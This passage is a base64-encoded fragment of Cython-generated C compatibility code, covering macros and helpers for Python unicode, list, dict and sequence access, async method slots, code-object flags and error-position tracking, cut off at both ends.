pY29kZU9iamVjdCAqKSh1KSktPndzdHJfbGVuZ3RoKSlcbiAgICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWSh1KSkgPyBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSA6IFB5VW5pY29kZV9HRVRfU0laRSh1KSkpXG4gICAgI2VuZGlmXG4gICNlbmRpZlxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdChhLCBiKSAgICAgIFB5TnVtYmVyX0FkZChhLCBiKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRTYWZlKGEsIGIpICBQeU51bWJlcl9BZGQoYSwgYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdChhLCBiKSAgICAgIFB5VW5pY29kZV9Db25jYXQoYSwgYilcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0U2FmZShhLCBiKSAgKCh1bmxpa2VseSgoYSkgPT0gUHlfTm9uZSkgfHwgdW5saWtlbHkoKGIpID09IFB5X05vbmUpKSA/XFxcbiAgICAgIFB5TnVtYmVyX0FkZChhLCBiKSA6IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoYSwgYikpXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgI2lmICFkZWZpbmVkKFB5VW5pY29kZV9EZWNvZGVVbmljb2RlRXNjYXBlKVxuICAgICNkZWZpbmUgUHlVbmljb2RlX0RlY29kZVVuaWNvZGVFc2NhcGUocywgc2l6ZSwgZXJyb3JzKSAgUHlVbmljb2RlX0RlY29kZShzLCBzaXplLCAidW5pY29kZV9lc2NhcGUiLCBlcnJvcnMpXG4gICNlbmRpZlxuICAjaWYgIWRlZmluZWQoUHlVbmljb2RlX0NvbnRhaW5zKVxuICAgICNkZWZpbmUgUHlVbmljb2RlX0NvbnRhaW5zKHUsIHMpICBQeVNlcXVlbmNlX0NvbnRhaW5zKHUsIHMpXG4gICNlbmRpZlxuICAjaWYgIWRlZmluZWQoUHlCeXRlQXJyYXlfQ2hlY2spXG4gICAgI2RlZmluZSBQeUJ5dGVBcnJheV9DaGVjayhvYmopICBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAmUHlCeXRlQXJyYXlfVHlwZSlcbiAgI2VuZGlmXG4gICNpZiAhZGVmaW5lZChQeU9iamVjdF9Gb3JtYXQpXG4gICAgI2RlZmluZSBQeU9iamVjdF9Gb3JtYXQob2JqLCBmbXQpICBQeU9iamVjdF9DYWxsTWV0aG9kKG9iaiwgIl9fZm9ybWF0X18iLCAiTyIsIGZtdClcbiAgI2VuZGlmXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0Zvcm1hdFNhZmUoYSwgYikgICgodW5saWtlbHkoKGEpID09IFB5X05vbmUgfHwgKFB5VW5pY29kZV9DaGVjayhiKSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoYikpKSkgPyBQeU51bWJlcl9SZW1haW5kZXIoYSwgYikgOiBQeVVuaWNvZGVfRm9ybWF0KGEsIGIpKVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfTGlzdEtlZXBOZXcob2JqKVxcXG4gICAgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChvYmopICYmIFB5X1JFRkNOVChvYmopID09IDEpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeVNlcXVlbmNlX0xpc3Qob2JqKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9MaXN0S2VlcE5ldyhvYmopICBQeVNlcXVlbmNlX0xpc3Qob2JqKVxuI2VuZGlmXG4jaWZuZGVmIFB5U2V0X0NoZWNrRXhhY3RcbiAgI2RlZmluZSBQeVNldF9DaGVja0V4YWN0KG9iaikgICAgICAgIF9fUHl4X0lTX1RZUEUob2JqLCAmUHlTZXRfVHlwZSlcbiNlbmRpZlxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwQTRcbiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9TRVRfUkVGQ05UKG9iaiwgcmVmY250KVxuICAjZGVmaW5lIF9fUHl4X1NFVF9TSVpFKG9iaiwgc2l6ZSkgUHlfU0VUX1NJWkUob2JqLCBzaXplKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9TRVRfUkVGQ05UKG9iaiwgcmVmY250KSBQeV9SRUZDTlQob2JqKSA9IChyZWZjbnQpXG4gICNkZWZpbmUgX19QeXhfU0VUX1NJWkUob2JqLCBzaXplKSBQeV9TSVpFKG9iaikgPSAoc2l6ZSlcbiNlbmRpZlxuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTIHx8IENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlMaXN0X0dldEl0ZW1SZWYobywgaSlcbiAgI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgKGxpa2VseSgoaSkgPj0gMCkgPyBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSkgOiAoUHlFcnJfU2V0U3RyaW5nKFB5RXhjX0luZGV4RXJyb3IsICJsaXN0IGluZGV4IG91dCBvZiByYW5nZSIpLCAoUHlPYmplY3QqKU5VTEwpKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpXG4gICNlbmRpZlxuI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihvLCBpKSBQeUxpc3RfR2V0SXRlbVJlZihvLCBpKVxuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgaSkgX19QeXhfWE5ld1JlZihQeUxpc3RfR2V0SXRlbShvLCBpKSlcbiAgI2VuZGlmXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKG8sIGkpIF9fUHl4X05ld1JlZihQeUxpc3RfR0VUX0lURU0obywgaSkpXG4jZW5kaWZcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoZGljdCwga2V5LCByZXN1bHQpIFB5RGljdF9HZXRJdGVtUmVmKGRpY3QsIGtleSwgcmVzdWx0KVxuI2VsaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgfHwgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RGljdF9HZXRJdGVtUmVmKFB5T2JqZWN0ICpkaWN0LCBQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqKnJlc3VsdCkge1xuICAqcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShkaWN0LCBrZXkpO1xuICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7XG4gICAgaWYgKFB5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoUHlFeGNfS2V5RXJyb3IpKSB7XG4gICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIHJldHVybiAtMTtcbiAgfVxuICByZXR1cm4gMTtcbn1cbiNlbHNlXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlEaWN0X0dldEl0ZW1SZWYoUHlPYmplY3QgKmRpY3QsIFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICoqcmVzdWx0KSB7XG4gICpyZXN1bHQgPSBQeURpY3RfR2V0SXRlbVdpdGhFcnJvcihkaWN0LCBrZXkpO1xuICBpZiAoKnJlc3VsdCA9PSBOVUxMKSB7XG4gICAgcmV0dXJuIFB5RXJyX09jY3VycmVkKCkgPyAtMSA6IDA7XG4gIH1cbiAgUHlfSU5DUkVGKCpyZXN1bHQpO1xuICByZXR1cm4gMTtcbn1cbiNlbmRpZlxuI2lmIGRlZmluZWQoQ1lUSE9OX0RFQlVHX1ZJU0lUX0NPTlNUKSAmJiBDWVRIT05fREVCVUdfVklTSVRfQ09OU1RcbiAgI2RlZmluZSBfX1B5eF9WSVNJVF9DT05TVChvYmopICBQeV9WSVNJVChvYmopXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1ZJU0lUX0NPTlNUKG9iailcbiNlbmRpZlxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgI2RlZmluZSBfX1B5eF9QeVNlcXVlbmNlX0lURU0obywgaSkgUHlTZXF1ZW5jZV9JVEVNKG8sIGkpXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcSkgIFB5X1NJWkUoc2VxKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgKFB5VHVwbGVfU0VUX0lURU0obywgaSwgdiksICgwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9JVEVNKG8sIGkpIFB5VHVwbGVfR0VUX0lURU0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgKFB5TGlzdF9TRVRfSVRFTShvLCBpLCB2KSwgKDApKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfSVRFTShvLCBpKSBQeUxpc3RfR0VUX0lURU0obywgaSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKG8sIGkpIFB5U2VxdWVuY2VfR2V0SXRlbShvLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXEpICBQeVNlcXVlbmNlX1NpemUoc2VxKVxuICAjZGVmaW5lIF9fUHl4X1B5VHVwbGVfU0VUX0lURU0obywgaSwgdikgUHlUdXBsZV9TZXRJdGVtKG8sIGksIHYpXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfSVRFTShvLCBpKSBQeVR1cGxlX0dldEl0ZW0obywgaSlcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfU0VUX0lURU0obywgaSwgdikgUHlMaXN0X1NldEl0ZW0obywgaSwgdilcbiAgI2RlZmluZSBfX1B5eF9QeUxpc3RfR0VUX0lURU0obywgaSkgUHlMaXN0X0dldEl0ZW0obywgaSlcbiNlbmRpZlxuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICNkZWZpbmUgX19QeXhfUHlUdXBsZV9HRVRfU0laRShvKSBQeVR1cGxlX0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlMaXN0X0dFVF9TSVpFKG8pIFB5TGlzdF9HRVRfU0laRShvKVxuICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlc19HRVRfU0laRShvKSBQeUJ5dGVzX0dFVF9TSVpFKG8pXG4gICNkZWZpbmUgX19QeXhfUHlCeXRlQXJyYXlfR0VUX1NJWkUobykgUHlCeXRlQXJyYXlfR0VUX1NJWkUobylcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKG8pIFB5VHVwbGVfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5TGlzdF9HRVRfU0laRShvKSBQeUxpc3RfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5U2V0X0dFVF9TSVpFKG8pIFB5U2V0X1NpemUobylcbiAgI2RlZmluZSBfX1B5eF9QeUJ5dGVzX0dFVF9TSVpFKG8pIFB5Qnl0ZXNfU2l6ZShvKVxuICAjZGVmaW5lIF9fUHl4X1B5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pIFB5Qnl0ZUFycmF5X1NpemUobylcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChvKSBQeVVuaWNvZGVfR2V0TGVuZ3RoKG8pXG4jZW5kaWZcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbiAgI2RlZmluZSBfX1B5eF9QeUltcG9ydF9BZGRNb2R1bGVSZWYobmFtZSkgUHlJbXBvcnRfQWRkTW9kdWxlUmVmKG5hbWUpXG4jZWxzZVxuICBzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJbXBvcnRfQWRkTW9kdWxlUmVmKGNvbnN0IGNoYXIgKm5hbWUpIHtcbiAgICAgIFB5T2JqZWN0ICptb2R1bGUgPSBQeUltcG9ydF9BZGRNb2R1bGUobmFtZSk7XG4gICAgICBQeV9YSU5DUkVGKG1vZHVsZSk7XG4gICAgICByZXR1cm4gbW9kdWxlO1xuICB9XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcpXG4gICNkZWZpbmUgUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcocykgUHlVbmljb2RlX0Zyb21TdHJpbmcocylcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeUxvbmdfRnJvbUhhc2hfdCBQeUxvbmdfRnJvbVNzaXplX3RcbiNkZWZpbmUgX19QeXhfUHlMb25nX0FzSGFzaF90ICAgX19QeXhfUHlJbmRleF9Bc1NzaXplX3RcbiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQTAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5U2VuZFJlc3VsdCBQeVNlbmRSZXN1bHRcbiNlbHNlXG4gICAgdHlwZWRlZiBlbnVtIHtcbiAgICAgICAgUFlHRU5fUkVUVVJOID0gMCxcbiAgICAgICAgUFlHRU5fRVJST1IgPSAtMSxcbiAgICAgICAgUFlHRU5fTkVYVCA9IDEsXG4gICAgfSBfX1B5eF9QeVNlbmRSZXN1bHQ7XG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBM1xuICB0eXBlZGVmIF9fUHl4X1B5U2VuZFJlc3VsdCAoKl9fUHl4X3B5aXRlcl9zZW5kZnVuYykoUHlPYmplY3QgKml0ZXIsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXN1bHQpO1xuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgc2VuZGZ1bmNcbiNlbmRpZlxuI2lmICFDWVRIT05fVVNFX0FNX1NFTkRcbiNkZWZpbmUgX19QWVhfSEFTX1BZX0FNX1NFTkQgMFxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4jZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDFcbiNlbHNlXG4jZGVmaW5lIF9fUFlYX0hBU19QWV9BTV9TRU5EIDIgIC8vIG91ciBvd24gYmFja3BvcnRlZCBpbXBsZW1lbnRhdGlvblxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPCAyXG4gICAgI2RlZmluZSBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCBQeUFzeW5jTWV0aG9kc1xuI2Vsc2VcbiAgICB0eXBlZGVmIHN0cnVjdCB7XG4gICAgICAgIHVuYXJ5ZnVuYyBhbV9hd2FpdDtcbiAgICAgICAgdW5hcnlmdW5jIGFtX2FpdGVyO1xuICAgICAgICB1bmFyeWZ1bmMgYW1fYW5leHQ7XG4gICAgICAgIF9fUHl4X3B5aXRlcl9zZW5kZnVuYyBhbV9zZW5kO1xuICAgIH0gX19QeXhfUHlBc3luY01ldGhvZHNTdHJ1Y3Q7XG4gICAgI2RlZmluZSBfX1B5eF9TbG90VHBBc0FzeW5jKHMpICgoUHlBc3luY01ldGhvZHMqKShzKSlcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfQU1fU0VORCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwRjBcbiAgICAjZGVmaW5lIF9fUHl4X1RQRkxBR1NfSEFWRV9BTV9TRU5EICgxVUwgPDwgMjEpXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfVFBGTEFHU19IQVZFX0FNX1NFTkQgKDApXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwXG4jZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeUludGVycHJldGVyU3RhdGVfR2V0KClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSBQeVRocmVhZFN0YXRlX0dldCgpLT5pbnRlcnBcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwXG4jaWZkZWYgX19jcGx1c3BsdXNcbmV4dGVybiAiQyJcbiNlbmRpZlxuUHlBUElfRlVOQyh2b2lkICopIFB5TWVtX0NhbGxvYyhzaXplX3QgbmVsZW0sIHNpemVfdCBlbHNpemUpO1xuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKFB5T2JqZWN0ICppbnNwZWN0LCBjb25zdCBjaGFyKiBuYW1lLCBpbnQgKndyaXRlX3RvKSB7XG4gICAgaW50IHZhbHVlO1xuICAgIFB5T2JqZWN0ICpweV92YWx1ZSA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoaW5zcGVjdCwgbmFtZSk7XG4gICAgaWYgKCFweV92YWx1ZSkgcmV0dXJuIDA7XG4gICAgdmFsdWUgPSAoaW50KSBQeUxvbmdfQXNMb25nKHB5X3ZhbHVlKTtcbiAgICBQeV9ERUNSRUYocHlfdmFsdWUpO1xuICAgICp3cml0ZV90byA9IHZhbHVlO1xuICAgIHJldHVybiB2YWx1ZSAhPSAtMSB8fCAhUHlFcnJfT2NjdXJyZWQoKTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCkge1xuICAgIFB5T2JqZWN0ICppbnNwZWN0O1xuICAgIGludCByZXN1bHQ7XG4gICAgaW5zcGVjdCA9IFB5SW1wb3J0X0ltcG9ydE1vZHVsZSgiaW5zcGVjdCIpO1xuICAgIHJlc3VsdCA9XG4jaWYgIWRlZmluZWQoQ09fT1BUSU1JWkVEKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19PUFRJTUlaRUQiLCAmQ09fT1BUSU1JWkVEKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fTkVXTE9DQUxTKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19ORVdMT0NBTFMiLCAmQ09fTkVXTE9DQUxTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fVkFSQVJHUylcbiAgICAgICAgX19QeXhfaW5pdF9jb192YXJpYWJsZShpbnNwZWN0LCAiQ09fVkFSQVJHUyIsICZDT19WQVJBUkdTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fVkFSS0VZV09SRFMpXG4gICAgICAgIF9fUHl4X2luaXRfY29fdmFyaWFibGUoaW5zcGVjdCwgIkNPX1ZBUktFWVdPUkRTIiwgJkNPX1ZBUktFWVdPUkRTKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fQVNZTkNfR0VORVJBVE9SKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19BU1lOQ19HRU5FUkFUT1IiLCAmQ09fQVNZTkNfR0VORVJBVE9SKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fR0VORVJBVE9SKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19HRU5FUkFUT1IiLCAmQ09fR0VORVJBVE9SKSAmJlxuI2VuZGlmXG4jaWYgIWRlZmluZWQoQ09fQ09ST1VUSU5FKVxuICAgICAgICBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlKGluc3BlY3QsICJDT19DT1JPVVRJTkUiLCAmQ09fQ09ST1VUSU5FKSAmJlxuI2VuZGlmXG4gICAgICAgIDE7XG4gICAgUHlfREVDUkVGKGluc3BlY3QpO1xuICAgIHJldHVybiByZXN1bHQgPyAwIDogLTE7XG59XG4jZWxzZVxuc3RhdGljIGludCBfX1B5eF9pbml0X2NvX3ZhcmlhYmxlcyh2b2lkKSB7XG4gICAgcmV0dXJuIDA7ICAvLyBJdFwncyBhIGxpbWl0ZWQgQVBJLW9ubHkgZmVhdHVyZVxufVxuI2VuZGlmXG5cblxuI2lmIGRlZmluZWQoX1dJTjMyKSB8fCBkZWZpbmVkKFdJTjMyKSB8fCBkZWZpbmVkKE1TX1dJTkRPV1MpXG4gICNpZm5kZWYgX1VTRV9NQVRIX0RFRklORVNcbiAgICAjZGVmaW5lIF9VU0VfTUFUSF9ERUZJTkVTXG4gICNlbmRpZlxuI2VuZGlmXG4jaW5jbHVkZSA8bWF0aC5oPlxuI2lmZGVmIE5BTlxuI2RlZmluZSBfX1BZWF9OQU4oKSAoKGZsb2F0KSBOQU4pXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgZmxvYXQgX19QWVhfTkFOKCkge1xuICBmbG9hdCB2YWx1ZTtcbiAgbWVtc2V0KCZ2YWx1ZSwgMHhGRiwgc2l6ZW9mKHZhbHVlKSk7XG4gIHJldHVybiB2YWx1ZTtcbn1cbiNlbmRpZlxuI2lmIGRlZmluZWQoX19DWUdXSU5fXykgJiYgZGVmaW5lZChfTERCTF9FUV9EQkwpXG4jZGVmaW5lIF9fUHl4X3RydW5jbCB0cnVuY1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfdHJ1bmNsIHRydW5jbFxuI2VuZGlmXG5cbiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS19SVU5USU1FXG4jZGVmaW5lIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRSAwXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS1xuI2RlZmluZSBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLIENZVEhPTl9DTElORV9JTl9UUkFDRUJBQ0tfUlVOVElNRVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDS1xuI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyBfX3B5eF9jbGluZW5vID0gX19MSU5FX187ICh2b2lkKSBfX3B5eF9jbGluZW5vOyB9XG4jZWxzZVxuI2RlZmluZSBfX1BZWF9NQVJLX0VSUl9QT1MoZl9pbmRleCwgbGluZW5vKSAgeyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X2ZbZl9pbmRleF07ICh2b2lkKSBfX3B5eF9maWxlbmFtZTsgX19weXhfbGluZW5vID0gbGluZW5vOyAodm9pZCkgX19weXhfbGluZW5vOyAodm9pZCkgX19weXhfY2xpbmVubzsgfVxuI2VuZGlmXG4jZGVmaW5lIF9fUFlYX0VSUihmX2luZGV4LCBsaW5lbm8sIExuX2Vycm9yKSBcXFxuICAgIHsgX19QWVhfTUFSS19FUlJfUE9TKGZfaW5kZXgsIGxpbmVubykgZ290byBMbl9lcnJvcjsgfVxuXG4jaWZkZWYgQ1lUSE9OX0VYVEVSTl9DXG4gICAgI3VuZGVmIF9fUFlYX0VYVEVSTl9DXG4gICAgI2RlZmluZSBfX1BZWF9FWFRFUk5fQyBDWVRIT05fRVhURVJOX0NcbiNlbGlmIGRlZmluZWQoX19QWVhfRVhURVJOX0MpXG4gICAgI2lmZGVmIF9NU0NfVkVSXG4gICAgI3ByYWdtYSBtZXNzYWdlICgiUGxlYXNlIGRvIG5vdCBkZWZpbmUgdGhlIFwnX19QWVhfRVhURVJOX0NcJyBtYWNybyBleHRlcm5hbGx5LiBVc2UgXCdDWVRIT05fRVhURVJOX0NcJyBpbnN0ZWFkLiIpXG4gICAgI2Vsc2VcbiAgICAjd2FybmluZyBQbGVhc2UgZG8gbm90IGRlZmluZSB0aGUgXCdfX1BZWF9FWFRFUk5fQ1wnIG1hY3JvIGV4dGVybmFsbHkuIFVzZSBcJ0NZVEhPTl9FWFRFUk5fQ1wnIGluc3RlYWQuXG4gICAgI2VuZGlmXG4jZWxzZVxuICAjaWZkZWYgX19jcGx1c3BsdXNcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVybiAiQyJcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0VYVEVSTl9DIGV4dGVyblxuICAjZW5kaWZcbiNlbmRpZlxuXG4jZGVmaW5lIF9fUFlYX0hBVkVfX29wXG4jZGVmaW5lIF9fUFlYX0hBVkVfQVBJX19vcFxuXG4jaWZkZWYgX09QRU5NUFxuI2luY2x1ZGUgPG9tcC5oPlxuI2VuZGlmIFxuXG4jaWYgZGVmaW5lZChQWVJFWF9XSVRIT1VUX0FTU0VSVElPTlMpICYmICFkZWZpbmVkKENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlMpXG4jZGVmaW5lIENZVEhPTl9XSVRIT1VUX0FTU0VSVElPTlNcbiNlbmRpZlxuXG4jZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIDBcbiNkZWZpbmUgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOCAwXG4jZGVmaW5lIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HICIiXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmcgX19QeXhfUHlCeXRlc19Gcm9tU3RyaW5nXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zyb21TdHJpbmdBbmRTaXplIF9fUHl4X1B5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemVcbiNkZWZpbmUgX19QeXhfdWNoYXJfY2FzdChjKSAoKHVuc2lnbmVkIGNoYXIpYylcbiNkZWZpbmUgX19QeXhfbG9uZ19jYXN0KHgpICgobG9uZyl4KVxuI2RlZmluZSBfX1B5eF9maXRzX1B5X3NzaXplX3QodiwgdHlwZSwgaXNfc2lnbmVkKSAgKFxcXG4gICAgKHNpemVvZih0eXBlKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgIHx8XFxcbiAgICAoc2l6ZW9mKHR5cGUpID4gc2l6ZW9mKFB5X3NzaXplX3QpICYmXFxcbiAgICAgICAgICBsaWtlbHkodiA8ICh0eXBlKVBZX1NTSVpFX1RfTUFYIHx8XFxcbiAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01BWCkgICYmXFxcbiAgICAgICAgICAoIWlzX3NpZ25lZCB8fCBsaWtlbHkodiA+ICh0eXBlKVBZX1NTSVpFX1RfTUlOIHx8XFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdiA9PSAodHlwZSlQWV9TU0laRV9UX01JTikpKSAgfHxcXFxuICAgIChzaXplb2YodHlwZSkgPT0gc2l6ZW9mKFB5X3NzaXplX3QpICYmXFxcbiAgICAgICAg